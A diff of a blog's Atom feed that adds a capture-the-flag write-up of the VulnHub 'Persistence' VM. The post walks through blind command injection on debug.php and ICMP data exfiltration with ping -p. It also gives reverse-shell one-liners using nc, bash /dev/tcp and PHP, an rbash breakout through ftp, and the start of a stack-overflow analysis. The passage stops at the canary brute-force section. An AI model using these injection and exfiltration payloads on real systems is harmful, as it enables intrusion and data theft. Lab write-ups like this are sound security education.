@@ -4,7 +4,7 @@
   <title><![CDATA[Category: ctf | #!/slash/note]]></title>
   <link href="http://leonjza.github.io/blog/categories/ctf/atom.xml" rel="self"/>
   <link href="http://leonjza.github.io/"/>
-  <updated>2014-08-17T16:21:58+02:00</updated>
+  <updated>2014-10-06T05:49:09+02:00</updated>
   <id>http://leonjza.github.io/</id>
   <author>
     <name><![CDATA[Leon Jacobs]]></name>
@@ -12,6 +12,1145 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[From Persistence, to pain, to PWN]]></title>
+    <link href="http://leonjza.github.io/blog/2014/09/18/from-persistence/"/>
+    <updated>2014-09-18T06:58:53+02:00</updated>
+    <id>http://leonjza.github.io/blog/2014/09/18/from-persistence</id>
+    <content type="html"><![CDATA[<h2>persist we must!</h2>
+
+<p>Persistence! A new boot2root hosted <a href="https://twitter.com/vulnhub">@VulnHub</a>, authored by <a href="https://twitter.com/superkojiman">@superkojiman</a> and sagi- definitely got the attention from the community it deserves! Persistence was actually part of a <a href="http://blog.vulnhub.com/2014/09/competition-persistence.html">writeup competition</a> launched on September the 7th, and ran up until October th 5th.</p>
+
+<p><blockquote><p>Energy and persistence conquer all things.</p><footer><strong>Benjamin Franklin</strong></footer></blockquote></p>
+
+<p>This is my experience while trying to complete the challenge. Persistence, once again, challenged me to learn about things that would normally have me just go &ldquo;meh, next&rdquo;. As expected, this post is also a very big spoiler if you have not completed it yourself yet, so be warned!</p>
+
+<h2>lets get our hands dirty</h2>
+
+<p>As usual, the goto tool was Kali Linux, and the normal steps of adding the OVA image to Virtualbox, booting, finding the assigned IP and running a Nmap scan against it was used.</p>
+
+<p>My VM got the IP 192.168.56.104, and the first Nmap result was:</p>
+
+<p>```bash First Persistence Nmap
+root@kali:~# nmap 192.168.56.104 &mdash;reason -sV -p-</p>
+
+<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-09-18 07:01 SAST
+Nmap scan report for 192.168.56.104
+Host is up, received reset (0.0037s latency).
+Not shown: 65534 filtered ports
+Reason: 65534 no-responses
+PORT   STATE SERVICE REASON  VERSION
+80/tcp open  http    syn-ack nginx 1.4.7</p>
+
+<p>Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
+Nmap done: 1 IP address (1 host up) scanned in 4131.90 seconds
+```</p>
+
+<p>Not exactly much to work with, but its something at least! We know now that according to the web server banners, we are facing nginx. A welcome change to the usual apache stuff we see! A quick and nasty Google for nginx 1.4.7 exploits also did not return with any really interesting results. Not a problem really.</p>
+
+<p>Browsing to the site did not reveal anything interesting. A creepy image of melting clocks (what&hellip;) with the page sources serving it being minimal and uninteresting too. Manually poking about the web paths (for things like robots.txt etc) also did not reveal anything. The first hint however came when I fiddled with the index page location.</p>
+
+<p>By default, most web servers will serve the default index page when no location is specified from the web root. So, I tried <code>index.html</code>, and got the normal landing. When I requested <code>index.php</code> though, things changed drastically:</p>
+
+<p>```bash PHP reveal
+root@kali:~# curl -v 192.168.56.104/index.php
+* About to connect() to 192.168.56.104 port 80 (#0)
+*   Trying 192.168.56.104&hellip;
+* connected
+* Connected to 192.168.56.104 (192.168.56.104) port 80 (#0)</p>
+
+<blockquote><p>GET /index.php HTTP/1.1
+User-Agent: curl/7.26.0
+Host: 192.168.56.104
+Accept: <em>/</em></p></blockquote>
+
+<ul>
+<li>additional stuff not fine transfer.c:1037: 0 0</li>
+<li>HTTP 1.1 or later with persistent connection, pipelining supported
+&lt; HTTP/1.1 404 Not Found
+&lt; Server: nginx/1.4.7
+&lt; Date: Thu, 18 Sep 2014 07:28:18 GMT
+&lt; Content-Type: text/html
+&lt; Transfer-Encoding: chunked
+&lt; Connection: keep-alive
+&lt; X-Powered-By: PHP/5.3.3</li>
+</ul>
+
+
+<p>No input file specified.</p>
+
+<ul>
+<li>Connection #0 to host 192.168.56.104 left intact</li>
+<li>Closing connection #0
+```</li>
+</ul>
+
+
+<p>As can be seen in the output above, the header <code>X-Powered-By: PHP/5.3.3</code> is now present, and the output <code>No input file specified.</code>. I recognized this as the behavior of Nginx when PHP-FPM is unable to locate the .php file it should be serving.</p>
+
+<h2>finding that (de)bugger</h2>
+
+<p>With this information now gathered, it was time to pull out one of my favorite tools, <code>wfuzz</code>! With <code>wfuzz</code>, the plan now was to attempt and discover a potentially interesting web path, or, because I know the web server has the capability of serving up PHP content, attempt to find arb PHP scripts.</p>
+
+<p>My first attempt to search for web paths failed pretty badly. All of the requests responded with a 404. Luckily I was aware of the PHP capabilities, so I set to find arbritary PHP scripts by appending <em>.php</em> to my <code>FUZZ</code> keyword:</p>
+
+<p>```bash discovering debug.php
+root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt &mdash;hc 404 <a href="http://192.168.56.104/FUZZ.php">http://192.168.56.104/FUZZ.php</a></p>
+
+<hr />
+
+<ul>
+<li>Wfuzz  2.0 &ndash; The Web Bruteforcer                     *</li>
+</ul>
+
+
+<hr />
+
+<p>Target: <a href="http://192.168.56.104/FUZZ.php">http://192.168.56.104/FUZZ.php</a>
+Payload type: file,/usr/share/wordlists/wfuzz/general/medium.txt</p>
+
+<h1>Total requests: 1660</h1>
+
+<h1>ID  Response   Lines      Word         Chars          Request    </h1>
+
+<p>00434:  C=200     12 L        28 W      357 Ch    &ldquo; &ndash; debug&rdquo;
+```</p>
+
+<p>Yay. <code>wfuzz</code> is stupidly fast and finished the above in like 4 seconds. Browsing to <a href="http://192.168.56.101/debug.php">http://192.168.56.101/debug.php</a> showed us a input field labeled &ldquo;Ping address:&rdquo; and a submit button</p>
+
+<p><img class="<a" src="href="http://i.imgur.com/neKe18e.png">http://i.imgur.com/neKe18e.png</a>"></p>
+
+<p>&ldquo;Command injection?&rdquo;, was the first thought here.</p>
+
+<h2>blind command injection</h2>
+
+<p>I started by entering a valid IP address that had <code>tcpdump</code> listening to test if the script is actually running a ping like it says &hellip;</p>
+
+<p><code>bash ping test
+root@kali:~# tcpdump icmp
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
+07:46:15.503023 IP 192.168.56.104 &gt; 192.168.56.102: ICMP echo request, id 64004, seq 1, length 64
+07:46:15.503040 IP 192.168.56.102 &gt; 192.168.56.104: ICMP echo reply, id 64004, seq 1, length 64
+07:46:16.503729 IP 192.168.56.104 &gt; 192.168.56.102: ICMP echo request, id 64004, seq 2, length 64
+07:46:16.503768 IP 192.168.56.102 &gt; 192.168.56.104: ICMP echo reply, id 64004, seq 2, length 64
+07:46:17.503180 IP 192.168.56.104 &gt; 192.168.56.102: ICMP echo request, id 64004, seq 3, length 64
+07:46:17.503260 IP 192.168.56.102 &gt; 192.168.56.104: ICMP echo reply, id 64004, seq 3, length 64
+07:46:18.502811 IP 192.168.56.104 &gt; 192.168.56.102: ICMP echo request, id 64004, seq 4, length 64
+07:46:18.502842 IP 192.168.56.102 &gt; 192.168.56.104: ICMP echo reply, id 64004, seq 4, length 64
+</code></p>
+
+<p>&hellip; which it was. What is important to note here is that we have 4 echo requests.</p>
+
+<p>I then proceeded to modify the input attempting to execute other commands too. None of my attempts returned any output to the browser, however, sending the field <code>;exit 0;</code> caused the HTTP request to complete almost instantly while no ping requests were observed on the <code>tcpdump</code>. This had me certain that this field was vulnerable to a command injection vulnerability.</p>
+
+<p>This is all good, but not getting any output makes it really had to work with this. So, the next steps were to try and get a reverse/bind shell out of this command injection vulnerability.</p>
+
+<p>I tried the usual culprits: <code>nc &lt;ip&gt;  &lt;port&gt; -e /bin/bash</code>; <code>bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1</code>; <code>php -r '$sock=fsockopen("&lt;ip&gt;",&lt;port&gt;);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code>. None of them worked. Eventually I started to realize that I may have a much bigger problem here. What if none of these programs (nc/bash/php) are either not executable by me or simply not in my PATH? What if there was a egress packet filter configured?</p>
+
+<h2>blind command injection &ndash; file enumeration</h2>
+
+<p>Ok, so I took one step back and had to rethink my strategy. I have blind command execution, but how am I going to find out what else is going on on the filesystem? Up to now I have simply assumed too much.</p>
+
+<p>I thought I should try and see if I can confirm the existence of files. To do this, I used a simple bash <code>if [ -f /file ]</code> statement, with a single ping for success, and 2 pings for a failure. The string for the <code>debug.php</code> input field looked something like this:</p>
+
+<p><code>bash File existence check payload
+;if [ -f /bin/sh ] ; then ping 192.168.56.102 -c 1 ; else ping 192.168.56.102 -c 2 ; fi
+</code></p>
+
+<p>Submitting the above input presented me with a single ping, confirming that <code>/bin/sh</code> exists.</p>
+
+<p>```bash File existence response
+root@kali:~# tcpdump icmp
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
+08:15:53.557994 IP 192.168.56.104 > 192.168.56.102: ICMP echo request, id 63493, seq 1, length 64
+08:15:53.558011 IP 192.168.56.102 > 192.168.56.104: ICMP echo reply, id 63493, seq 1, length 64</p>
+
+<p>```</p>
+
+<p>Checking for something like <code>/bin/sh2</code> responded with 2 pings, as expected. Awesome. I can now enumerate the existence of files. The concept itself is probably pretty useless, however, if I can confirm the existence of something useful, such as <code>/bin/nc</code>, I may end up with greater success of a shell!</p>
+
+<p>I continued to test numerous files on numerous locations on disk. I noticed a few files that would generally be available on most Linux systems were not available according to my checker which was really odd. It actually had me doubt the check too. Nonetheless,  <code>/usr/bin/python</code> appeared to be available! I really like python so this had me really happy.</p>
+
+<h2>blind command injection &ndash; port scanner</h2>
+
+<p>I tested a few commands with <code>python -c</code>, such as sleep etc just to confirm that it is working. I then proceeded to try and get a reverse shell going using it.</p>
+
+<p>No. Luck.</p>
+
+<p>I no longer doubted the fact that I had a working interpreter, however, the question about a egress firewall still remains unanswered. To test this, I decided to code a small, cheap-and-nasty port &lsquo;prober&rsquo; so that I can try and determine which port is open outgoing. The idea was to watch my <code>tcpdump</code> for any tcp traffic comming from this host:</p>
+
+<p>```python probe.py
+import socket
+for port in xrange(1, 65535):</p>
+
+<pre><code>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.settimeout(0.1)
+sock.connect_ex(("192.168.56.102", port))
+sock.close()
+</code></pre>
+
+<p>```</p>
+
+<p>Using my blind command injection, I echoed this content to <code>/tmp/probe.py</code> via the input field, and then in a subsequent request, ran it using <code>python /tmp/probe.py</code>. I was relatively certain the script was running as intended as it took the expected amount of time (similar to when I was testing locally) to complete the HTTP request. According to my prober (and assuming it actually worked), there were 0 tcp ports open&hellip;</p>
+
+<h2>data exfiltration</h2>
+
+<p>With no tcp out, I had to once again rethink what I have up to now. The only output I have atm is a true/false scenario. Hardly sufficient to do anything useful. I found the <code>debug.php</code> file on disk and tried to echo a PHP web shell to the same directory. This also failed.</p>
+
+<p>So, only ping eh. I recall something about ping tunnels/ping shells/ping something. So, I googled some of these solutions. There were a number of things I could try, however, I was wondering how the actual data transport was happening for these things.</p>
+
+<p>Eventually, I came across the <code>-p</code> argument for ping after reading <a href="http://blog.commandlinekungfu.com/2012/01/episode-164-exfiltration-nation.html">this</a> blogpost. From <code>man 8 ping</code> we read:</p>
+
+<p><code>bash ping patterns
+-p pattern
+   You may specify up to 16 ``pad'' bytes to fill out the packet you send.
+   This is useful for diagnosing data-dependent problems in a network.
+   For example, ``-p ff'' will cause the sent packet to be filled with all ones.
+</code></p>
+
+<p>So that changes things. I quickly confirmed that we have <code>xxd</code> available using my previous enumeration method and we did. Great.</p>
+
+<p>I fired up tcpdump with the <code>-X</code> flag to show me the packet contents, and tested it out with the following payload for the <code>id</code> command:</p>
+
+<p><code>bash Ping pattern `id` command
+;id| xxd -p -c 16 | while read line; do ping -p $line -c 1 -q 192.168.56.102; done
+</code></p>
+
+<p>On the <code>tcpdump</code> side of things&hellip;</p>
+
+<p>```bash Ping pattern tcpdump
+root@kali:~/Desktop# tcpdump icmp -X
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
+09:18:14.439222 IP 192.168.56.104 > 192.168.56.102: ICMP echo request, id 6920, seq 1, length 64</p>
+
+<pre><code>0x0000:  4500 0054 0000 4000 4001 488a c0a8 3868  E..T..@.@.H...8h
+0x0010:  c0a8 3866 0800 4b5b 1b08 0001 56a3 1a54  ..8f..K[....V..T
+0x0020:  f357 0a00 6e67 696e 7829 2067 7569 643d  .W..nginx).guid=
+0x0030:  3439 3828 6e67 696e 7829 2067 7569 643d  498(nginx).guid=
+0x0040:  3439 3828 6e67 696e 7829 2067 7569 643d  498(nginx).guid=
+0x0050:  3439 3828                                498(
+</code></pre>
+
+<p>09:18:14.439248 IP 192.168.56.102 > 192.168.56.104: ICMP echo reply, id 6920, seq 1, length 64</p>
+
+<pre><code>0x0000:  4500 0054 a049 0000 4001 e840 c0a8 3866  E..T.I..@..@..8f
+0x0010:  c0a8 3868 0000 535b 1b08 0001 56a3 1a54  ..8h..S[....V..T
+0x0020:  f357 0a00 6e67 696e 7829 2067 7569 643d  .W..nginx).guid=
+0x0030:  3439 3828 6e67 696e 7829 2067 7569 643d  498(nginx).guid=
+0x0040:  3439 3828 6e67 696e 7829 2067 7569 643d  498(nginx).guid=
+0x0050:  3439 3828                                498(
+</code></pre>
+
+<p>09:18:14.440365 IP 192.168.56.104 > 192.168.56.102: ICMP echo request, id 7176, seq 1, length 64</p>
+
+<pre><code>0x0000:  4500 0054 0000 4000 4001 488a c0a8 3868  E..T..@.@.H...8h
+0x0010:  c0a8 3866 0800 318a 1c08 0001 56a3 1a54  ..8f..1.....V..T
+0x0020:  e35a 0a00 6769 6e78 2920 6772 6964 3d34  .Z..ginx).grid=4
+0x0030:  3938 286e 6769 6e78 2920 6772 6964 3d34  98(nginx).grid=4
+0x0040:  3938 286e 6769 6e78 2920 6772 6964 3d34  98(nginx).grid=4
+0x0050:  3938 286e                                98(n
+</code></pre>
+
+<p>09:18:14.440382 IP 192.168.56.102 > 192.168.56.104: ICMP echo reply, id 7176, seq 1, length 64</p>
+
+<pre><code>0x0000:  4500 0054 a04a 0000 4001 e83f c0a8 3866  E..T.J..@..?..8f
+0x0010:  c0a8 3868 0000 398a 1c08 0001 56a3 1a54  ..8h..9.....V..T
+0x0020:  e35a 0a00 6769 6e78 2920 6772 6964 3d34  .Z..ginx).grid=4
+0x0030:  3938 286e 6769 6e78 2920 6772 6964 3d34  98(nginx).grid=4
+0x0040:  3938 286e 6769 6e78 2920 6772 6964 3d34  98(nginx).grid=4
+0x0050:  3938 286e                                98(n
+</code></pre>
+
+<p>09:18:14.441191 IP 192.168.56.104 > 192.168.56.102: ICMP echo request, id 7432, seq 1, length 64</p>
+
+<pre><code>0x0000:  4500 0054 0000 4000 4001 488a c0a8 3868  E..T..@.@.H...8h
+0x0010:  c0a8 3866 0800 ed92 1d08 0001 56a3 1a54  ..8f........V..T
+0x0020:  f95d 0a00 286e 6769 6e78 290a 6f75 7073  .]..(nginx).oups
+0x0030:  3d34 3938 286e 6769 6e78 290a 6f75 7073  =498(nginx).oups
+0x0040:  3d34 3938 286e 6769 6e78 290a 6f75 7073  =498(nginx).oups
+0x0050:  3d34 3938                                =498
+</code></pre>
+
+<p>09:18:14.441198 IP 192.168.56.102 > 192.168.56.104: ICMP echo reply, id 7432, seq 1, length 64</p>
+
+<pre><code>0x0000:  4500 0054 a04b 0000 4001 e83e c0a8 3866  E..T.K..@..&gt;..8f
+0x0010:  c0a8 3868 0000 f592 1d08 0001 56a3 1a54  ..8h........V..T
+0x0020:  f95d 0a00 286e 6769 6e78 290a 6f75 7073  .]..(nginx).oups
+0x0030:  3d34 3938 286e 6769 6e78 290a 6f75 7073  =498(nginx).oups
+0x0040:  3d34 3938 286e 6769 6e78 290a 6f75 7073  =498(nginx).oups
+0x0050:  3d34 3938                                =498
+</code></pre>
+
+<p>```</p>
+
+<p>Mind. Blown.</p>
+
+<p>In case you don&rsquo;t see it, we have extracts of the <code>id</code> command in the request/response packets like <em>98(nginx).grid=4</em>. While this is not really fun to decipher, and with commands that produce a lot of output even worse, it was in fact <strong>something</strong> to work with!</p>
+
+<p>I fiddled around with this for a little while longer, trying to make the output a little more readable. Eventually I fired up scapy and just printed the data section of the packet. Not much better, but with a little more effort I am sure you can get something very workable out of it.</p>
+
+<p>```python Scapy sniff()</p>
+
+<blockquote><blockquote><blockquote><p>sniff(filter=&ldquo;icmp[icmptype] == 8 and host 192.168.56.104&rdquo;, prn=lambda x: x.load)
+ؤT�nginx) guid=498(nginx) guid=498(nginx) guid=498(
+ؤT
+   ginx) grid=498(nginx) grid=498(nginx) grid=498(n
+ؤT�(nginx)
+oups=498(nginx)
+oups=498(nginx)
+oups=498
+```</p></blockquote></blockquote></blockquote>
+
+<h2>sysadmin-tool</h2>
+
+<p>So with actual output to work with, I can almost say I have shell, however, it&rsquo;s crap. Here I had many options to go for. Do I try and get one of those ping tunnels up to shell with? Or something else.</p>
+
+<p>At one stage I ran <code>ls</code> as the command trying to see if there was anything in the web path that I may not have found yet. A file called <em>sysadmin-tool</em> was revealed. I browsed to the file which pushed it as a download for me, and saved it locally. I then ran the bin through <code>strings</code>:</p>
+
+<p><code>bash sysadmin-tool strings
+root@kali:~# strings sysadmin-tool
+/lib/ld-linux.so.2
+__gmon_start__
+libc.so.6
+_IO_stdin_used
+chroot
+strncmp
+puts
+setreuid
+mkdir
+rmdir
+chdir
+system
+__libc_start_main
+GLIBC_2.0
+PTRh
+[^_]
+Usage: sysadmin-tool --activate-service
+--activate-service
+breakout
+/bin/sed -i 's/^#//' /etc/sysconfig/iptables
+/sbin/iptables-restore &lt; /etc/sysconfig/iptables
+Service started...
+Use avida:dollars to access.
+/nginx/usr/share/nginx/html/breakout
+</code></p>
+
+<p>From this alone we can deduce that when run, it may modify the firewall. It also looks like it contains some credentials, so I took note of those too. I then tried to run the command, followed by a nmap scan:</p>
+
+<p><code>bash Ping pattern `id` command
+;./sysadmin-tool --activate-service| xxd -p -c 16 | while read line; do ping -p $line -c 1 -q 192.168.56.102; done
+</code></p>
+
+<p>```bash second nmap of Persistence
+root@kali:~# nmap 192.168.56.104 &mdash;reason -sV -p-</p>
+
+<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-09-18 09:46 SAST
+Nmap scan report for 192.168.56.104
+Host is up, received reset (0.0017s latency).
+Not shown: 65533 filtered ports
+Reason: 65533 no-responses
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 5.3 (protocol 2.0)
+80/tcp open  http    syn-ack nginx 1.4.7</p>
+
+<p>Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
+Nmap done: 1 IP address (1 host up) scanned in 6637.05 seconds
+```</p>
+
+<p>Yay! SSH.</p>
+
+<h2>shell and breakout as avida</h2>
+
+<p>Using the information that looked like credentials retrieved in the previous section, I proceeded to SSH into the server:</p>
+
+<p><code>bash avida rbash
+root@kali:~/Desktop/persistence# ssh avida@192.168.56.104
+The authenticity of host '192.168.56.104 (192.168.56.104)' can't be established.
+RSA key fingerprint is 37:22:da:ba:ef:05:1f:77:6a:30:6f:61:56:7b:47:54.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '192.168.56.104' (RSA) to the list of known hosts.
+avida@192.168.56.104's password:    # dollars
+Last login: Thu Sep 18 05:57:30 2014
+-rbash-4.1$
+</code></p>
+
+<p>Op success. Or is it? I immediately noticed the prompt as <code>rbash</code>, aka restricted bash. :( Having a look around, I was in fact very limited to what I can do. Most annoyingly, I was unable to run commands with a <code>/</code> in them.</p>
+
+<p><code>bash rbash restrictions
+-rbash-4.1$ /bin/bash
+-rbash: /bin/bash: restricted: cannot specify `/' in command names
+</code></p>
+
+<p>So the next logical step was to attempt &lsquo;breaking out&rsquo; of this shell so that I can have a better look around. I was able to cat say <code>/etc/passwd</code>, but that only gets you <em>that</em> far :P</p>
+
+<p>After quite some time and some research, it became apparent that the well known breakouts from rbash are not possible.  I was unable to edit my PATH, change files and re-login or use the classic <code>vi</code> <code>:shell</code> breakout. Eventually (and out of desperation), I focussed my attention to <code>ftp</code>. Opening <code>ftp</code>, and typing <code>help</code> at the prompt, I studied each available command carefully. In the list was a exclamation mark(!), which I typed and pressed enter:</p>
+
+<p><code>bash bash via ftp o_0
+-rbash-4.1$ ftp
+ftp&gt; !
++rbash-4.1$ /bin/bash
+bash-4.1$
+</code></p>
+
+<p>I got dropped into another <code>rbash</code> shell, however this time with a +. So, I went for <code>/bin/bash</code> and&hellip; w00t? I exported a new PATH to my environment, and all of those annoying rbash restrictions were gone. Thank goodness!</p>
+
+<h2>the wopr game</h2>
+
+<p>During the enumeration done while still stuck with <code>rbash</code>, I noticed that the machine was listening for connections on tcp/3333 locally when inspecting the output of <code>netstat</code>. Opening a telnet session to this port presented you with a &lsquo;game&rsquo;:</p>
+
+<p>```bash wopr
+bash-4.1$ telnet 127.0.0.1 3333
+Trying 127.0.0.1&hellip;
+Connected to 127.0.0.1.
+Escape character is &lsquo;^]&rsquo;.
+[+] hello, my name is sploitable
+[+] would you like to play a game?</p>
+
+<blockquote><p>yes!
+[+] yeah, I don&rsquo;t think so
+[+] bye!
+Connection closed by foreign host.
+bash-4.1$
+```</p></blockquote>
+
+<p>I asked really, really nicely, but no matter how polite I was, it would just not let me play!</p>
+
+<p>Further inspection showed that the game was possibly run as root from <code>/usr/local/bin/wopr</code></p>
+
+<p>```bash wopr as root
+bash-4.1$ ps -ef | grep wopr
+root      1005     1  0 05:42 ?        00:00:00 /usr/local/bin/wopr
+root      1577  1005  0 06:43 ?        00:00:00 [wopr] <defunct>
+avida     1609  1501  0 06:47 pts/0    00:00:00 grep wopr</p>
+
+<p>bash-4.1$ ls -lah /usr/local/bin/wopr
+-rwxr-xr-x. 1 root root 7.7K Apr 28 07:43 /usr/local/bin/wopr
+```</p>
+
+<p><code>wopr</code> was also readable to me which was great news! I decided to get a copy of the binary onto my local Kali Linux box, and take a closer look at the internals:</p>
+
+<p>```bash wopr xxd xfer</p>
+
+<h1>first, hex encode the file</h1>
+
+<p>bash-4.1$ xxd -p -c 36 /usr/local/bin/wopr
+7f454c460101010000000000000000000200030001000000c08604083400000080110000
+0000000034002000090028001e001b000600000034000000348004083480040820010000
+[&hellip; snip &hellip;]
+38362e6765745f70635f7468756e6b2e6278006d61696e005f696e697400
+bash-4.1$</p>
+
+<h1>next, I copied the xxd output from the persistence terminal</h1>
+
+<h1>and pasted it into a file called wopr.xxd. Then reverted it</h1>
+
+<h1>and redirected the output to <code>wopr</code></h1>
+
+<p>root@kali:~# cat wopr.xxd | xxd -r -p > wopr
+```</p>
+
+<p>The idea was to see if there may be a way to exploit this program so that I can execute some commands using it. It is running as root after all&hellip;</p>
+
+<h2>wopr, stack smashing</h2>
+
+<p>Poking around the binary, I mostly used <code>gdb</code> along with <a href="https://github.com/longld/peda">peda</a>.
+Checksec revealed that this binary was compiled with quite a few security features built in.</p>
+
+<p><code>bash wopr binary sec
+root@kali:~# gdb -q ./wopr
+Reading symbols from persistence/wopr...(no debugging symbols found)...done.
+gdb-peda$ checksec
+CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+</code></p>
+
+<p>Digesting the above output should bring us to a few conclusions. A stack canary is present, meaning if we corrupt memory, and dont have a correct canary, the binary may terminate itself as a protection mechanism once it detects the incorrect canary. Secondly, the binary is compiled to mark the stack as non executable. Any potential shellcode that we write here will not be executed. Lastly, the GOT relocation is set to read only, meaning function locations are resolved at the beginning of execution and the GOT is then marked as read only resulting in the inability to rewrite plt type lookups.</p>
+
+<p>With all of that in mind, I ran the binary with the <code>r</code> command, and made a new telnet session to it.</p>
+
+<p><code>bash wopr run
+gdb-peda$ r
+[+] bind complete
+[+] waiting for connections
+[+] logging queries to $TMPLOG
+[+] got a connection
+[New process 26936]
+[Inferior 2 (process 26936) exited normally]
+Warning: not running or target is remote
+gdb-peda$
+</code></p>
+
+<p>When the new connection came in, a notice of a new process appears. Disassembling the main function gives us an indication that the process is doing a <code>fork()</code></p>
+
+<p>```bash wopr fork()
+gdb-peda$ disass main
+Dump of assembler code for function main:</p>
+
+<pre><code>[.. snip ..]
+</code></pre>
+
+<p>   0x080489fd &lt;+543>:   mov    DWORD PTR [esp],0x8048cb2
+   0x08048a04 &lt;+550>:   call   0x804866c &lt;puts@plt>
+   0x08048a09 &lt;+555>:   call   0x804867c &lt;fork@plt> # &lt;&mdash;
+   0x08048a0e &lt;+560>:   test   eax,eax
+   0x08048a10 &lt;+562>:   jne    0x8048b0e &lt;main+816>
+   0x08048a16 &lt;+568>:   mov    DWORD PTR [esp+0x8],0x21
+   0x08048a1e &lt;+576>:   mov    DWORD PTR [esp+0x4],0x8048cc8
+   0x08048a26 &lt;+584>:   mov    eax,DWORD PTR [ebp-0x22c]
+   0x08048a2c &lt;+590>:   mov    DWORD PTR [esp],eax
+   0x08048a2f &lt;+593>:   call   0x804858c &lt;write@plt></p>
+
+<pre><code>[.. snip ..]
+</code></pre>
+
+<p>End of assembler dump.
+gdb-peda$
+```</p>
+
+<p>Why is the <code>fork()</code> so important!? We will see in a bit just hang on. :)</p>
+
+<p>So back to fuzzing wopr, I proceeded to send some arbtritary input via the telnet session. I noticed once I had sent more than 30 characters as input, wopr would freak out! This is a good freak out btw :D</p>
+
+<p>Sending 30 x A&rsquo;s results in:
+<code>bash wopr stopper
+gdb-peda$ [+] got a connection
+*** stack smashing detected ***: wopr terminated
+======= Backtrace: =========
+/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x40)[0xb7f5ebb0]
+/lib/i386-linux-gnu/libc.so.6(+0xeab6a)[0xb7f5eb6a]
+wopr[0x80487dc]
+wopr[0x8048ad6]
+/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xe6)[0xb7e8ae36]
+wopr[0x80486e1]
+======= Memory map: ========
+08048000-08049000 r-xp 00000000 08:01 1184792    wopr
+08049000-0804a000 r--p 00000000 08:01 1184792    wopr
+0804a000-0804b000 rw-p 00001000 08:01 1184792    wopr
+0804b000-0806c000 rw-p 00000000 00:00 0          [heap]
+b7e3b000-b7e57000 r-xp 00000000 08:01 1573598    /lib/i386-linux-gnu/libgcc_s.so.1
+b7e57000-b7e58000 rw-p 0001b000 08:01 1573598    /lib/i386-linux-gnu/libgcc_s.so.1
+b7e73000-b7e74000 rw-p 00000000 00:00 0
+b7e74000-b7fbd000 r-xp 00000000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
+b7fbd000-b7fbe000 ---p 00149000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
+b7fbe000-b7fc0000 r--p 00149000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
+b7fc0000-b7fc1000 rw-p 0014b000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
+b7fc1000-b7fc4000 rw-p 00000000 00:00 0
+b7fde000-b7fe1000 rw-p 00000000 00:00 0
+b7fe1000-b7fe2000 r-xp 00000000 00:00 0          [vdso]
+b7fe2000-b7ffe000 r-xp 00000000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
+b7ffe000-b7fff000 r--p 0001b000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
+b7fff000-b8000000 rw-p 0001c000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
+bffdf000-c0000000 rw-p 00000000 00:00 0          [stack]
+</code></p>
+
+<p>So it looks like we may have a <a href="http://en.wikipedia.org/wiki/Stack_buffer_overflow">buffer overflow</a> here. What is important though is the backtrace shows that the last fail was in <code>__fortify_fail</code>. <code>__fortify_fail</code> is normally just a error reporter, as was called because the stack cookie check failed. Remember the CANARY we detected earlier with the <code>checksec</code> output? With that knowledge, is almost safe to assume that byte 30 is where the stack canary starts. This means that if we want to corrupt more memory further up the stack (which is what we want actually), we need to find a way to know what the canary value is.</p>
+
+<p>But lets not stop there. I continued to place more A&rsquo;s into the input until at byte 39 I noticed 41 (hex for A) in the backtrace. By the time I had 42 A&rsquo;s, the backtrace had a full 4 bytes of 41.</p>
+
+<p><code>bash possible EIP
+[+] got a connection
+*** stack smashing detected ***: wopr terminated
+======= Backtrace: =========
+/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x40)[0xb7f5ebb0]
+/lib/i386-linux-gnu/libc.so.6(+0xeab6a)[0xb7f5eb6a]
+wopr[0x80487dc]
+[0x41414141]        #&lt;-- EIP?
+</code></p>
+
+<p>Was this where EIP was?</p>
+
+<p>With the debugging we have done thus far, lets assume that the stack layout looks something like this:</p>
+
+<p>```text
+&ndash; &ndash;>         &ndash; &ndash;>        [42 Bytes  in Total]        &ndash; &ndash;>         &ndash; ></p>
+
+<p>[        30 Bytes Data         ] [  Cookie  ] [  4 Bytes  ] [  EIP  ]</p>
+
+<ul>
+<li>&ndash;>         &ndash; &ndash;>        [42 Bytes  in Total]        &ndash; &ndash;>         &ndash; >
+```</li>
+</ul>
+
+
+<h2>wopr &ndash; stack canary bruteforce</h2>
+
+<p>This part of the challenge took me the second longest to nail. I have zero knowledge of stack cookies, let alone experience in bypassing them. So I had to pack out my best Google-fu abilities and learn all I can about bypassing these cookies.</p>
+
+<p>A lot was learnt here. The 3 primary resources that really helped me get the ball rolling into something workable was</p>
+
+<ul>
+<li><a href="http://phrack.org/issues/67/13.html">Phrack Issue 67</a></li>
